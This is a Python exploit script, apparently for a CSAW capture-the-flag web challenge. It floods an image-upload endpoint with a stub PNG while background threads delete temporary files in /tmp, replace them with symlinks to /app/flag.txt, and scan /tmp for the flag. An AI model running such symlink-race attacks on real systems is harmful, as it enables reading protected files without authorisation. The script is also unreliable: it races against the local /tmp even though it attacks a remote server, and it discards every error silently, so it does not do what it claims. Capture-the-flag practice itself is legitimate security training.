import requests
import threading
import time
import os
from pathlib import Path
import string
import random

def create_png():
    # Create a minimal valid PNG file
    png_header = bytes.fromhex('89504e470d0a1a0a0000000d49484452') + b'\x00' * 16
    with open('valid.png', 'wb') as f:
        f.write(png_header)

def upload_file():
    files = {'image': open('valid.png', 'rb')}
    try:
        r = requests.post('http://web.chal.csaw.io:5000/upload', files=files)
        return r.text
    except:
        return None

def monitor_files():
    seen_files = set()
    while True:
        try:
            current_files = set(os.listdir('/tmp'))
            new_files = current_files - seen_files

            for fname in new_files:
                full_path = os.path.join('/tmp', fname)
                try:
                    with open(full_path, 'rb') as f:
                        content = f.read()
                        text = content.decode('utf-8', errors='ignore')
                        if 'flag{' in text:
                            print(f"Found flag in {fname}: {text}")
                            os._exit(0)
                except:
                    pass

            seen_files = current_files
        except:
            pass
        time.sleep(0.01)

def race_condition():
    while True:
        try:
            # Look for potential temp files
            tmp_files = list(Path('/tmp').glob('tmp*'))
            for tmp_file in tmp_files:
                try:
                    # Try to race by replacing content
                    os.unlink(tmp_file)
                    os.symlink('/app/flag.txt', tmp_file)
                except:
                    pass
        except:
            pass
        time.sleep(0.01)

# Create PNG file
create_png()

# Start monitoring thread
monitor_thread = threading.Thread(target=monitor_files)
race_thread = threading.Thread(target=race_condition)

monitor_thread.daemon = True
race_thread.daemon = True

monitor_thread.start()
race_thread.start()

# Main loop for uploads
while True:
    upload_file()
    time.sleep(0.1)
